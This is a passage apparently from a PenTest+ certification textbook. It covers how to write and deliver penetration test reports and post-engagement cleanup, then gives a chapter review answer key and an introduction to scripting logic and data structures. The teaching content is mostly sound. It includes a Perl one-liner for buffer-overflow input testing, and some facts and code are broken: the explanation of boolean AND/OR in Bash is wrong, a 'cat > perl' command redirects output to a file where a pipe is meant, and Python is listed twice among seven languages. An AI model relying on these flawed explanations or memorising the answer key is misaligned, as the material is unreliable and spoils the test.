Some other criteria include organizing findings by the environment tested, by testing method, or by finding type. Listing the highest-severity findings first can suggest a priority for remediation and set the most serious issues in front for discussion. If a pentest is scoped to include multiple environments, such as multiple applications, devices, or physical sites, those may be grouped into the same report and the findings organized by the environment. Similarly, some consultancies may scope physical penetration testing with wireless or network testing, but choose to provide the results in a single report. In that case, findings may be ordered by the type of testing that led to the finding. Findings might be separated as tactical findings (system-specific weaknesses that resulted in successful attack) or as strategic findings (issues caused by weaknesses in the broader implementation of controls or other approaches to security).

Metrics and Measures

Relevant metrics will vary depending on the nature and goal of the pentest and on the client's need. What metrics you include and where you include them will depend on what you want to communicate. Metrics should provide visibility into a problem, provide a common language for understanding a program or report, and enable planning and decision making with measurable information. Generally, there are two kinds of metrics: reporting-level metrics and program-level metrics.

Reporting-level measurements apply to the results of a report within the scope of that report. The number of findings or affected targets, the number of findings by type or severity, the impact score overall, or other goal attainment metrics may all be useful, depending on the objectives of the test. Finding types may be based on strategic observations, such as inconsistencies across system configurations within the environment, misapplication of security best practices for handling of sensitive data, or authentication and authorization issues. Impact scoring might apply to data confidentiality, integrity, or availability of key data types and may be expressed as an overall measurement for the test or by individual findings. Goal attainment measurements might include the number of phishing e-mails attempted vs. the number that were clicked vs. the number that resulted in system compromise for a social engineering engagement, as an example.

Program-level measurements are typically designed to measure security maturity and improvement over time. Time to remediation, number of findings by severity or by impact over time, coverage of security assessments across an environment (for example, percentage of applications tested within a portfolio), or even frequency of testing can be program-level metrics. While the scope of a penetration test will often limit the available metrics to the report level, a report consumer may want the report to contain specific metrics or formats in order to compare to the results of previous engagements or remediation initiatives in order to build those program-level trends and statistics.

Conclusion

The conclusion summarizes the pentest results, including a high-level summary of recommendations that can be used to develop a forward-looking roadmap. This section should succinctly and purposefully address wrap-up for all of the issues you brought up in the report. This section shouldn't wholly repeat what is in the executive summary. Instead, focus on next steps for the report consumer.

Appendixes

Not all reports have or need an appendix, and some reports may have more than one appendix. The easiest way to think of appendixes is that they contain details that would otherwise affect the readability of the report. If a finding affects 200 hosts, listing each host on the same page as the finding would bury the details of the actual test result under pages of hostnames or IP addresses. Instead, you could list the affected hostnames in an appendix and reference it in the finding.

Appendixes are also where you can put information that may not be explicitly part of the scope or evidence, but may still be useful for the report consumer—either to understand the pentest results or to act on remediation. This might include templates used for social engineering pretexts, port and protocol charts, source code references, supporting data regarding targeting (such as relevant device schematics or lists of compromised assets), indicators of compromise (IOCs) from the test (these are useful for client after-action reviews), or testing logs containing timestamps for follow-up investigations. These will go at the end of the report, after the conclusion, and should be grouped and referenced according to each data type's purpose (i.e., Appendix A: Compromised User Accounts, Appendix B: Application URIs Tested, Appendix C: HID Reader System Diagram).

Storage and Secure Distribution

Pentest reports and evidence contain a lot of sensitive information. They may even be a roadmap to an organization's total compromise. Therefore, they should be stored and transmitted securely and kept only as long as necessary to satisfy the terms of the contract. The rules of engagement (RoE) will typically define handling instructions agreed upon with the client.

Secure delivery should use a format and distribution method that all parties have agreed upon during the initial planning phases. For example, the pentest report is often written using some type of word processing software (e.g., Microsoft Word, LibreOffice Writer, etc.), which can later be published and delivered to the customer as a PDF to prevent additional changes once the report is completed. This may then be delivered by encrypting the report and using a secure transport mechanism to deliver it. You could use 7zip (https://www.7-zip.org) to compress and encrypt the report, protecting it using a strong password. Then you might upload the report via a secure file transfer service or a secure e-mail delivery system. The key is to follow the agreement that you and the customer made during planning.

TIP You should not use the same delivery mechanism for the decryption password as you do the encrypted report. This way, you maximize continuity and reduce the risk of unauthorized disclosure should one path become compromised.

The report should be securely stored to avoid tampering or unauthorized disclosure, but retention timelines may vary. As a best practice, the pentest team (or consultant) may wish to consider storing a single digital copy of the report in an encrypted vault and limit and monitor access to that vault to ensure the confidentiality and integrity of the deliverable. The retention interval will often be determined by the terms of the contract, customer demands, and nature of ongoing engagements. For instance, depending on their risk appetite, the customer may ask the pentest team (or consultant) to retain a digital copy of the report until sometime after delivery has been made. The customer may want to issue a final acceptance before remaining copies are properly disposed of. In another case, pentest teams may need to perform retesting and need to access the details of the previous report in order to retrace their steps.

NOTE Every organization has its own level of risk appetite, which is how much risk the organization is willing to tolerate to achieve its goals. In the case of penetration testing, the organization may apply some tight constraints on how their internal environment is accessed, how sensitive data is being handled, and who is allowed to conduct the testing. These control procedures can help reduce the amount of risk exposure during a pentest, should an attack vector lead to a successful compromise.

Attestations

An attestation is a written statement provided by an independent third party (e.g., a pentesting consultancy) that is designed to give the organization credibility to other external parties, often as a part of an audit process. Since attestation letters are provided outside of the report and do not contain specific findings or vulnerability data, they can be publicly shared with outside parties who share concern about the client's security but should maybe not have in-depth information about the internal environment. An attestation declares that the independent party has performed security testing against the organization and, based on that testing, has observed that the organization is adequately protected according to best practices and the testing done. Of course, this statement only applies to the testing result and what was observed during testing. What the client does or doesn't do with the results can affect the actual value of the attestation.

Findings, Recommendations, and Analysis

A finding is something that could be advantageous to a malicious threat actor when attacking the customer's network. Findings should only include actionable items from the exploitation and post-exploitation activities. In your finding template, include a unique identifier, finding name, severity rating, description with evidence, impact, recommendation, and references.

The finding ID is a unique identifier given to a finding that can be used to track prioritization efforts and set milestones to close open findings post-report delivery. Typically, you would include this with each finding and use it for indexing your report or findings section. These IDs will be used for reference during remediation efforts and possibly during trend analysis across pentest engagements.

Since numbers are harder to remember, findings also typically include a short name for reference. This can be a generic name or a summary that describes the weakness, such as "Default password for Tomcat user account." It should be distinct enough from other findings to be used as a reference, but don't try to explain the whole details in the name.

A severity rating allows you to rank findings against one another and aids the report consumer to set priority for remediation efforts. Typically, the determination of severity criteria is mutually agreed upon between the tester and the client at the beginning of the engagement. Pentest organizations and consultancies may publish the criteria for severity as part of the report. This can be done qualitatively or quantitatively. The Penetration Testing Execution Standard (PTES) provides a qualitative example scale to use for information security risk rating.1 Some organizations may prefer a more numbers-based approach and look to a formal risk rating methodology in an attempt to objectively standardize scoring efforts. Two objective methodologies include the OWASP Risk Rating Methodology2 and the Common Vulnerability Scoring System (CVSS).3

Each finding needs to provide a description that allows the reader to understand what the finding means and should provide supporting evidence (i.e., screenshots, notes, proof-of-concept [PoC] examples, etc.) that explains how the vulnerability was exploited. This way the customer can duplicate the finding as part of remediation validation and evaluate possible fixes. In your writing, try to give the reader enough information to put the finding in context, understand how it works, understand its impact to the business, and hopefully how to prevent it from being successfully exploited in the future. An example writing outline could use the following questions as a guide:

• When did it take place? In the context of other attacks, where does this finding occur?

• What happened?

• Where did it take place? What systems or targets were involved?

• Why did it happen? Was there a particular weakness that allowed this to work?

The impact section should answer the big question: So what? Why should the report consumer care about this finding? What's the impact of a successful attack? Has this resulted in unauthorized access or transfer of protected or sensitive information? Did this attack enable compromise of other accounts or assets, or a higher level of privilege on one or more assets? Some of this may be built into the severity rating, but this section allows space for the pentester to elaborate on the justification for scoring.

A pentester's job doesn't stop at the identification of weakness; we also have to make meaningful suggestions about how to prevent malicious actors from succeeding in future attacks against the same environment. Recommendations may apply to technical controls, administrative controls, operational controls, or physical controls. This is where a pentester's understanding of operation comes into play. Making actionable and realistic recommendations is very difficult if you do not understand the realities of running an environment for practical use. We'll address each of these control types in a moment.

Findings may also include additional references that customers can use to get more information about the problem. These answer questions like "how applicable is this weakness in my environment?" These references can be blog posts that explain the attack, industry references regarding best practices, vulnerability writeups, or even presentations and demos that have been made available online.

Example finding:

This guidance may not apply uniformly to all findings, but it does give you a starting point for how to address the findings and testing narratives. Each finding should explain what you did in order to exploit the weakness and provide enough information that the report consumer can understand the impact of that exploitation. For more examples of common findings, the Common Findings Database is a community-driven project with several examples of findings that pentesters have historically found useful: https://github.com/obscuritylabs/OS-CFDB.

NOTE It is not possible for a pentester to evaluate all vulnerability scan findings. Vulnerability scanners may trigger local privilege escalation findings from an unauthenticated remote scan based purely on a banner version that is inaccurate due to backporting. For a pentester who is limited to an external point of view for testing, it is impossible to validate that. This is a key reason why most companies offer a differentiation between vulnerability assessment services and penetration testing. Penetration testing explores actual impact, not potential impact.

Recommendations

Recommendations do not exist only at the finding level. Overall recommendations may appear in the executive summary and conclusion of the report as well. In each case, pentesters fail when they make recommendations that do not adequately address the security problem, but also when recommendations are not reasonable, attainable, or cost-effective.

Always consider the business use case, and remember that remediation does not need to be perfect. It is not always realistic to eliminate all risk. Findings should help the business understand the risk, and recommendations should give them a way to reduce risk to a level they can accept. A perfect solution that renders a system useless is not reasonable.

Recommendations that are impossible due to resource and system limitations or implementation time frames are equally problematic. Weighing the cost of business against the cost of securing that business can be tricky. In an ideal world, we would be able to fix everything the right way, and with infinite money and infinite resources, we could. Unfortunately, tough decisions will sometimes need to be made. Businesses must weigh the potential cost of being affected against the cost of taking action to fix it. Let's take a look at a few example recommendations in the context of the four categories of controls we introduced earlier: technical controls, administrative controls, operational controls, and physical controls.

Technical Controls

These recommendations apply to security that is enforced automatically as a result of systems settings or software. Make sure your recommendations fall within the operating parameters for the systems in question. Some systems cannot implement long or complex passwords, for example. Here are some technical control recommendations and when you might use them:

• System hardening is the process of applying system settings and configurations designed to reduce a system's vulnerability to attack. This recommendation reduces the system attack surface when you see unnecessary service exposure, guest accounts, and default passwords.

• Sanitizing user-controlled inputs and parameterizing queries can help prevent injection attacks.

• Implementing multifactor or password-less authentication can reduce the risk of exposed login interfaces and weak passwords.

• Password encryption can reduce the impact for systems that are compromised in other ways. If passwords are encrypted with a strong algorithm and with secure implementation of encryption, it makes it more difficult for an attacker to use those credentials for subsequent attacks.

• Application whitelisting may be appropriate in an environment where upload and execution of binaries are particularly easy during the pentest.

• Patch management may be a challenge for the company if you are able to identify many known-exploitable vulnerabilities that should have been patched. However, not all systems can be patched because of stability concerns, and network segmentation is sometimes required.

• Password and key rotation should be recommended if very old passwords or keys are identified in the environment. This poses a risk from any previous data exposure, as well as from former staff.

• Standardizing and automating a process for managing the certificate lifecycle should be recommended when expired or misused certificates are identified during testing.

• Secrets management applies to securing certificates, auth keys, and passwords. This is a solid recommendation when you find passwords stored in plaintext or when you identify keys or certificates in insecure locations during a pentest.

• Network segmentation helps reduce the potential impact of compromise by limiting an attacker's ability to perform lateral movement and eavesdrop on network traffic.

Administrative Controls

These are policies and procedures that are implemented by human actions as opposed to system settings. This may include governance items like security baseline requirements, requirements for what security controls must be installed, and other terms of how systems should be used. Make these recommendations while keeping in mind that, without enforcement, a policy or a standard provides little to no actual security. These recommendations will often operate hand-in-hand with technical controls for enforcement. Here are some administrative controls recommendations and when you might use them.

• Role-based access control (RBAC) establishes what a person is allowed to access based on their job role. This can mitigate vertical privilege escalation. Recommendations for RBAC come into play when the principle of least privilege is inconsistently applied across accounts, especially with those sharing similar job roles.

• SDLC security protects the organization against attacks on code they develop or use within the enterprise. This extends to supply chain attacks against code that the organization may use as dependencies and insider threats. This recommendation helps if you find cases where source code is easily modified (and the change goes undetected), if you are able to gain access to continuous integration or continuous delivery (CI/CD) infrastructure during a pentest, or if software dependencies lack appropriate integrity checking.

• Password requirement best practices are policies or standards that determine what the technical controls must implement. While technical controls may exist and be in use, if they are not required to meet a reasonable bar for security, the organization may remain vulnerable to brute-force guessing and dictionary attacks.

Operational Controls

Controls that apply to the behavior of people and are enforced by people are operational controls. Recommendations that apply to operational controls attempt to address weaknesses identified in business processes or user behavior as opposed to weak policies or technical implementations. Enforcement often comes with executive backing and relies on employment consequences for these to provide effective improvements to security. Here are some examples of operational controls recommendations:

• Job rotation and mandatory vacations ensure redundancy in staff capabilities, as well as provide a check to validate an individual's scope of access. From a security perspective, this recommendation applies in cases where pentests reveal vulnerability or weakness introduced by an employee's misuse of resources that has gone undetected by the organization.

• Time-of-day restrictions limit when accounts are operational within the environment or when people are allowed access to facilities. These controls can help defenders detect behavioral anomalies that may indicate that an attacker (or a pentester) is acting within the environment. This may be useful as a recommendation when penetration tests observe clearly aberrant hours of activity that go undetected.

• User training is often recommended in cases where social engineering attacks are successful or where people do not observe security best practices, when technical controls cannot fully prevent the attack's success. Making users aware of what an attack might look like, giving them a sense of responsibility for the security of the enterprise, and educating them about the appropriate course of action during extranormal events can help secure the organization against some attacks.

Physical Controls

Controls that govern physical access to buildings and assets fall under this category. Door locks, cameras, Faraday cages, badge reader systems, guard posts, and fences are all physical controls. Most of the time recommendations that apply to this category will be issued as a result of a physical penetration test, but the same rules about applicability, cost, and feasibility apply. Acting on many of these recommendations involves cost and effort that are not trivial, and they add very little security if the implementation is easily bypassed. Here are a few examples of physical controls recommendations and when you might suggest them:

• Access control vestibules, air locks, sally ports, or a "mantrap" is a physical space bounded by sets of interlocking doors. This control can be used to trap an intruder inside that space and forbid ingress or egress depending on the access failure. This recommendation may be useful for protecting an area with a higher security need, as it can trap an intruder for further action and protect human and computing assets from harm or theft, and you can require multiple mechanisms of authentication (one for each door) to increase the bar for entry. However, these are typically fairly expensive, and the costs should definitely be weighed against the recommendations.

• Biometric controls involve using personally identifying characteristics, such as an eye scan, handprint, fingerprint, or voiceprint, to increase the difficulty for an attacker to obtain unauthorized access. This is often recommended to bolster existing access control mechanisms.

• Video surveillance recommendations may involve adding or improving camera surveillance of access points. This may be a pertinent recommendation when camera surveillance is not existent, if camera placement is inadequate, or if video quality is insufficient to stand against a physical pentest attempt. However, this recommendation only applies when the surveillance is actively maintained, reviewed, or monitored and responded to.

Common Themes and Root Causes

We've talked about recommendations, but your job is not only to identify the finding and propose a recommendation for remediation. Pentesters bring value through expert analysis of the findings. Don't only think about the tactical fix for the single thing you find. Look for the root cause wherever possible. Not clear about what this means? Let's say that you found several instances of XSS vulnerabilities and multiple opportunities for successful SQL injection during pentesting. You have findings for each of these, and each has recommendations to sanitize user-controlled input or parameterize queries. But why is this happening so often?

Common themes within your findings may speak to a higher root cause. Findings in a pentest report may sometimes be the direct result of vulnerabilities, implementation weaknesses, development practices, or policy implementations that cause a cascade of findings. Identify those root causes and tailor your advice accordingly. In this case, development practices might be missing oversight to detect these kinds of problems before code is promoted to production (best practices), developers may be reusing insecure code for forms or other user input during development (vulnerabilities), or they may not have the education to realize when additional security measures are required when they code.

In some cases, multiple findings could be resolved by the same actions, and that will need to be reflected in your overall recommendations. So, when you put all of those findings in the report, you should recognize through analysis there's a common theme. You will need to raise awareness that there is an overall strategic weakness causing security problems in the environment, and you may also need to explain in an executive summary: these findings could all be addressed by socializing security among users, performing better policy enforcement, and maybe even by providing password vaults.

NOTE A top-down management approach is a statement of influence from senior management that dictates goals, objectives, or how something will be done regarding a project or task, then disseminating that vision to lower levels of authority to put a successful plan into action.

Vulnerabilities can be introduced by missing patches, improper handling of user-controlled inputs in applications, and common system misconfigurations, among others. Here are some examples of common themes and root causes you might encounter:

• Inconsistent patching and configuration management

• Insecure code reuse

• Insecure data handling practices

• Weak/improper use of encryption

• Vulnerable application components

• Ineffective or missing network segmentation

• Inadequate privilege segmentation

• Not following the principle of least privilege

• Insufficient monitoring or incident response processes

• Password reuse or account sharing

• Weak authentication and authorization management

• Lack of best practices, such as secure benchmarks and controls (https://www.cisecurity.org/cybersecurity-best-practices/)

Post-Engagement Activities

Reporting and delivery are not the end of a pentester's responsibilities to a customer. There are a few other things we need to do at the end of an engagement. Cleanup of testing artifacts, gaining client acceptance, examining our lessons learned, initiating follow-up actions or further testing, and final data destruction are all examples of post-engagement activities we should think about.

Cleanup

You should strive not to leave a tested environment in a vulnerable state. Once you're certain that testing is complete, it's time to say goodbye to your shells and your loot and remove persistence mechanisms, payloads, or other testing artifacts. Leaving behind a shell or credential so that it can be leveraged by an attacker is a poor business practice. In some cases, you will need to coordinate these activities with your point of contact, as systems administrators may need to reboot targeted hosts in order to clear the contents of memory, even if nothing was written to disk. Or you may no longer have shell access to a system on which you made changes for testing. Testing tools, such as Metasploit, frequently have mechanisms that are designed to clean up after themselves, but they are not perfect. This is why we take detailed notes about what we did for our report.

TIP A good rule of thumb: Leave it the way you found it.

Client Acceptance

In some cases, the customer may ask questions to better understand the attack path taken by the pentest team or to share the experiences with more of their support staff, who may have been victimized by the pentest or who were not present at all during testing. Either way, you will still need to provide attestation and supporting evidence of the findings. Any artifacts, presentations, etc., created to support the customer debriefing(s) will also be just as sensitive as the reports, so following recommended storage and delivery mechanisms will likely be required. Some of the benefits of meeting face-to-face is customer acceptance of the findings and group discussion of lessons learned. In some cases, the customer may need to ask questions before they understand the true magnitude of the situation. Sometimes having someone in the room who can articulate the methodologies, draw things out on a whiteboard, or answer a bunch of questions will help get the point across as to why or how something is a finding.

EXAM TIP In the exam or in the exam objectives, the terms "client" or "customer" may be used interchangeably. However, they have the same meaning.

Lessons Learned

Taking the time to objectively examine what went well and what maybe did not go so well during planning, execution, and delivery can help improve client satisfaction, future tests, and testing processes. An example would be following up with your client to find out whether recommendations for remediation are achievable, realistic, and effective at preventing future exploitation using the same techniques. Another example would be looking at what you did during and after testing to determine whether your planning and scoping activities collected the right information, or if you had to go back to your point of contact for additional clarification or re-evaluation during testing. The objective of deriving lessons learned is to make necessary changes to how you work to improve efficacy of the pentest process and the quality of the deliverables.

Retesting and Follow-up

With any luck, the customer will ask you to come back for another assessment. This could be to retest closure of the findings after proper mitigation or for another round of penetration testing at a later time. These types of follow-up actions are a good way to keep in touch with the customer and build a good business relationship with them so they keep seeking out your skills. If the customer has requested validation testing when that is not addressed in your current contract or statement of work, this could be a sign of scope creep and could affect the pentest schedule or completion date for the project. However, the new requirement would be a good justification to use for requesting additional time and funding to complete validation testing.

Chapter Review

Writing the report can be a very time-consuming process. Developing a report template can help save time in the long run, as most of the content of how testing activities are conducted and evaluated follow similar procedures and should only require minor edits to make the activity or attack vector applicable to the customer's environment. The executive summary outlines the high-level summaries of the testing activities and does not include the details from the pentest. The report should include all of the approved attack vectors and testing activities approved in the RoE, regardless of whether the testing activity yielded any useful results during the pentest. This detail gives the customer assurance that they have coverage in certain areas and can prioritize remediation efforts toward areas of concern.

The pentest report documents the journey that was taken to tell a cohesive story of the customer's environment and how it stands up to security best practices. Be clear when communicating by using the appropriate level of detail for your intended audience, and describe the necessary information for that audience to understand the results of your test. When the report is completed, it is important to follow the procedures documented in the RoE that identify the report handling requirements to ensure secure delivery of the final product. The stronger the relationship you build with the customer, the more likely they are to request your services again in the future.

1. B, C. The executive summary provides high-level details concerning the pentest and the findings. Typically, only high-level or critical findings are talked about in this section, with little to no technical details that are not required for the audience to understand the problems. References are used to address other areas of research and accompany the findings and are not included in the executive summary.

2. C. The SOW is the statement of work, which identifies the scope of work and testing activities to be completed during the pentest.

3. A, D. The delivery method for the report should be agreed to by all parties identified in the RoE. The delivery method may include encrypting the report and using a secure transport mechanism like encrypted e-mail to deliver it.

4. B. Once the customer has provided confirmation of successful delivery and extraction of the report, the pentest team should consider storing a single digital copy of the report in an encrypted vault to prevent against unauthorized disclosure. All remaining digital or written copies of the report should be marked for proper disposal and deletion, based on agreed-upon methods outlined in the RoE.

5. C. Password requirement best practices defined in policies or standards are administrative controls.

6. B. This is an example of a CSRF attack, attempting to redirect a legitimate session to transfer funds by using a disguised link.

7. D. Turning off the server is not reasonable, as the system is needed, and it must be accessed. Passwords that are only eight characters and case-insensitive are trivial to brute-force based on keyspace limitations, so this is not adequate to fix the problem. Replacing the system is not cost-effective or necessarily achievable.

CHAPTER 11

Tools and Code Analysis

In this chapter, you will learn about

• The basic concepts of scripting and programming, including logic constructs, data structures, libraries, classes, procedures, and functions

• Shells and how to create them using various scripting languages

• Analyze exploit scripts or code and understand their use

• Investigate automation of basic pentesting tasks

Programming languages are instructions that tell a computer what to do. Each programming language has a different approach to doing this and may implement different syntax or capabilities. As we learned in Chapter 7, pentesters need to understand languages such as Objective C, Swift, C, Java, Kotlin, and HTML5 in order to analyze code in mobile applications. However, reverse engineers who seek vulnerabilities in programs may use Assembly, and pentesters working on platforms written in other languages may require expertise in those languages. Regardless of specialty, pentesters often find a need for familiarity in a few scripting languages. These scripting languages are important for navigating Windows and Linux OSs, automating penetration testing tasks, and common development of exploits.

The CompTIA PenTest+ exam focuses on assuring you have basic literacy in seven languages: Bash, Python, Perl, Ruby, JavaScript, Python, and PowerShell. You could fill an entire book with details about each of these languages. In fact, people have. Our goal is not to make you an expert in these languages, but to recognize the languages and hopefully navigate them well enough to understand basic examples. In this chapter, we will introduce programming concepts you will need to demonstrate literacy in these languages. We will discuss logic constructs; data structures; and functional program components like libraries, classes, and procedures with examples in each applicable language. Then we will delve into practical examples of code and walk you through analysis of the code.

Logic Constructs

Logic constructs are decision points in the code that cause differences in execution based on specific circumstances. These come in the form of conditional statements, loops, boolean operators, string operators, and arithmetic operators. Before we get into practical programming examples, let's talk about some of these logic constructs. We'll start with conditionals.

Conditionals

Let's say you write a script to read a file that has IP addresses, hostnames, and CIDR ranges in it. If the line from the file has an IP address, you want to print the IP address. If the line has a CIDR range, you want to expand all the IP addresses in that range and print those. If the line has a hostname, you want to perform a lookup for the IP address of that hostname and print the IP address. You need your script to take a different action based on the condition it encounters.

Programs make decisions like this by using conditional statements, expressions, and constructs. Some common conditionals are if statements and case and switch statements. Our introductory example would be fairly simple to implement using a complex if statement. This is often expressed as an else if, elseif, elsif, or elif. In Ruby, this would look something like this:

Some languages also implement a ternary statement for this logic. A ternary statement is typically denoted by the ? and : symbols. Here's a Ruby example that tests whether the number (in our case 6) is less than 10. If it is, it will return true and then print "true." If it is not, it will return false and then print "false."

Another implementation is a switch or case statement. Since Python has complex if statement logic, it doesn't bother to implement case or switch. However, Bash, PowerShell, Ruby, and JavaScript each have some implementation of either case or switch. In Bash and JavaScript, these statements will compare for exact matches, but not a condition. You won't say "in the case our number is less than 10…," but rather "in the case our number is 9, do X. In the case our number is 8, do Y." Other languages, like PowerShell are a little more flexible:

In this example, the variable $\_ contains the value that is sent to the switch statement—in this case, 8. The switch statement prints "small" if that value is less than 5, "medium" if it is greater than 5 but less than 10, and "large" if it is greater than 9. In this case, the switch statement would print "medium" since we used the number 8.

NOTE To read more about the various conditional operators in PowerShell, read the Microsoft document "about\_Comparison\_Operators" for PowerShell 7.1: https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about\_comparison\_operators?view=powershell-7.1

Loops

Loops tell a program to perform a set of actions repeatedly. In general, a loop has two parts: a conditional statement that determines when the loop should stop and a loop body containing the actions that are performed during each cycle through the loop. The conditional statement determines the kind of loop. For example, you may loop until a condition is met, loop while a particular condition exists, or loop a specific number of times. Let's take a closer look at one type of loop: the for loop.

for loops are generally used to iterate over a list of items. This could be lines from a file or a range of numbers, for example. A loop continues until the condition at the beginning of the loop is met. However, the conditions of the loop are not the only way loop iteration can end. A loop can also be interrupted by the code inside the loop body. Most languages implement something similar to a break statement, which signals to the program that loop processing should stop at that point and the rest of the code should execute. JavaScript's for loop looks like the following:

This sets num to an initial value of 0. Then it adds 1 to num each time the loop completes, and it continues to execute as long as num is less than 5. Each time it loops, it prints the value of num to the screen. Since JavaScript is a web-based programming language, it can write things to HTML code, alert windows, or the JavaScript console. It doesn't typically print or echo things to the screen. In this case, we're using document.write() solely for testing purposes.

TIP Loops are recognizable by having a conditional statement and the presence of for, until, or while surrounding a body of executable code.

Boolean Operators

The boolean operators most languages implement are AND, OR, and NOT. These are often represented as &&, ||, and !, respectively. Let's look at this in Bash. Each command you run will return some value. It will either be successful (true) or it will fail (false). If we use grep to search the /etc/passwd file for a user called "rick," it will return true if it finds an account called "rick" and false if it can't find it:

grep "rick" /etc/passwd

Using a boolean AND operator, we could do the following:

grep "rick" /etc/passwd && echo "User found!"

If the grep command succeeds, it will return true. A boolean AND operator will force the echo command to execute successfully as well (true) and print "User found!" to the console. If the grep command fails, the echo command will also be canceled. With a boolean AND, both statements must complete with the same status. If the first command is true, then the second command is true. If the first command is false, then the second command must also be false.

If we implement this with a boolean OR operator:

grep "rick" /etc/passwd || echo "User not found!"

If the grep command succeeds (returning true), the OR operator will force the echo to be unsuccessful (false), meaning nothing will echo. If the grep command fails (returning false), the echo command must succeed (returning true) and it will print "User not found!" to the screen. With a boolean OR, both statements must complete with a different status. If the first command is true, the second command must be false, and vice versa.

You could chain these together much like a ternary operator and do something like the following:

grep "rick" /etc/passwd && echo "User found!" || echo "User not found."

For a boolean NOT operator, we can choose to execute if a condition is not met. Sticking with Bash, the following example uses an if statement to test whether the file "error.log" exists, and if it does not, it creates it using the touch command:

Arithmetic and String Operators

Arithmetic operators are for performing mathematical calculations. Addition, subtraction, division, multiplication—you get the idea. Using Perl at the command line, this will output 10:

$ perl -e 'print 5+5'

String operators are designed to do things like format a string, concatenate multiple strings, perform string substitution, remove characters from the end or beginning of a string, and match all or part of a string. We'll show some more examples of this in the "Practical Examples" section later in this chapter. For now, let's look at two quick one-liners in Perl that will illustrate the concept of string operators.

Assume you have a file that has a list of usernames in it, and the end of each line has a newline at the end of it. Your script will read these usernames and add them to the system. However, you don't want to create a username with a newline at the end of it. If you want to use the usernames from the file in your script, you will first need to strip the newline from the end. To do this in a one-liner, you could cat the file in Bash, redirect it to a Perl command line, and then chomp the string, like so:

$ cat usernames.txt \> perl -e 'while (\<\>){chomp($\_); adduser($\_)}'

In Perl, the chomp function removes trailing newline characters from the string. In the preceding example, $\_ is a special variable that represents the data sent to Perl from our cat command. This is a perfectly acceptable example of string manipulation, but let's look at one more example.

Assume you are testing an application for the existence of a buffer overflow. To do this, you want to print the letter A 500 times and send it to the login form. You could type this by hand, and it would take approximately forever. Or you could do it with a string operator in Perl from the command line:

$ perl -e 'print "A" x 500'

There are numerous other string operators. We can't cover every one here, but the various programming language references contain thorough documentation of each language's implementation of string operators.

NOTE Here are some references for each language regarding string operators:

Data Structures

Data structures provide a way to store and express data for ease of use by programs. These establish formats for data, define relationships between different data values, and determine what can be done with those values so that programs can use the data effectively. In this section, we'll introduce a few concepts like key values and keys, arrays, dictionaries, lists, and trees at a high level. Then we'll look at three common data formats: JSON, XML, and CSV.

Key Values and Keys

A key is a unique identifier that a program can use to reference some item of data (the key value). Using these key-value pairs, applications can get to the specific piece of data that they are looking for without having to look at every piece of data. These key-value pairs have different names depending on the language. They can be known as associative arrays, dictionaries, and hashes. Regardless of what they are called, the primary benefit of these data structures are that they take two related pieces of information and allow them to be associated together.

Arrays, Dictionaries, and Lists

If you want to keep track of what groceries you want, you could use an array of milk, eggs, apples, and frozen pizza. Arrays are either fixed- or variable-length groups of data that are indexed sequentially. Sometimes, we want to make sure that an array stays in order, and arrays are not inherently ordered. Lists are ordered, however, and are used similarly to arrays. We would use them when building a shopping list based on the order we shop in the store. We would likely want to get apples first, then eggs, then milk, and then frozen pizza last. The array may not keep these in the same order once they are added, but a list will maintain order.

Dictionaries use a key:value pair. The key is always a single value, but the value may be a single item, a list of items, or even another dictionary. If we want to keep track of our favorites for shopping, we may want to say that our favorite apple is granny smith, but we may have two favorite pizzas: pepperoni and supreme. A dictionary can keep track of both of these things because each key has a direct relationship to another piece of data, either a string or an array. This might look like this in Python:

favs = {'apple': 'granny smith', 'pizza': ['pepperoni','supreme']}

And then we can access our favorites by using the key for the value we are looking for:

Trees

Trees allow us to keep track of sorted data easily. There are two ways we can sort data: on access and on addition. Trees let us get to the sorted data more quickly because all of the expensive sorting operations happen upon insertion of the data. Trees are different from other data structures because they have a root node, one that you always start with, and then from there the data is linked off of that node. Figure 11-1 helps us to think of this like categorizing animals. Animals would be the root of your tree, and then we might categorize the animals by two-legged and four-legged animals. From there additional categorizations could be made, and each node that is traversed gets us closer to the data that we are looking for.

Figure 11-1 Tree diagram

CSV, XML, and JSON

One of the challenges of interoperating between applications is sharing data. While inside a specific application, a data structure can easily live in its native form such as a dictionary or an array. However, because each language and application may deal with a data structure differently, it's important to be able to share the data in a common format. Let's talk about three data formats: CSV, XML, and JSON.

Comma-separated value (CSV) uses commas to separate values in the data store. A list of people may include attributes like first name, last name, address, and city for each entry. Tools can easily read these values from a CSV if the first line of the CSV includes the field names and each subsequent line has the values for each record separated by commas. One example might look like this:

This is easy when the data is all the same, but what if your data doesn't have a consistent structure? Extensible Markup Language (XML) is for well-documented data types that need to be consistent. Here is one way to represent the preceding data in XML:

The overall structure is a list of people called "PersonList." Each person is separately listed, and the attributes for each person are labeled using tags. Tags have a beginning and end value, and the document may even have a document type definition (DTD) that will explain how an XML document needs to be organized and what fields are valid. XML has a lot of overhead associated with it, but it is easy to validate that data is valid or not.

JavaScript Object Notation (JSON) is a little better for freeform data types and is a favorite for data exchanges. JSON is common for web transactions between frameworks because it is easily interpreted in browsers and across other languages. Multiple back-ends written in different languages can all easily understand JSON with limited overhead of creating script definitions of what is valid or not.

Let's extend our earlier example with people. What if we had individuals in different countries and we wanted to know what state or province the city is in? JSON can easily deal with this like the following:

Our two people are in different countries. In Canada, the city may be grouped by provinces. In United States, the city would be part of a state. JSON can handle this seamlessly, and it will be up to the application handling the data to understand the differences. We have two different types of data in this JSON object, the curly braces indicate it's an object, and the brackets indicate that it is part of an array.

The format you use will depend on the data structures that you are using and what the sensitivity is to differences. CSV doesn't deal with differences in data easily, XML is OK with differences as long as they are allowed as part of the data format, and JSON can be anything as long as you can express it in a data structure type that JSON can understand.

Other Programming Concepts

Now that we understand how data is handled and some of the key logical and semantic constructs of languages, it's important to understand some of the ways that applications can be organized to make them more manageable and able to support concepts such as code reuse and data organization. Not every language implements these concepts equally, but for those that do, let's talk about procedures, functions, classes, and libraries.

Procedures

Procedures group instructions together that may need to be executed multiple times. Procedures don't typically take additional options; they only contain code to perform a series of logical steps. If you frequently need to delete all of the files out of the /tmp directory that are older than 24 hours, you might make a procedure to perform that task.

Procedures don't return data, so their use is limited to repetitive tasks. A common procedure that an application might use would be to print out the usage options of an application so that if any of the options don't validate properly, it will print out the same way each time. Here is an example in Ruby of a sample usage procedure:

Functions

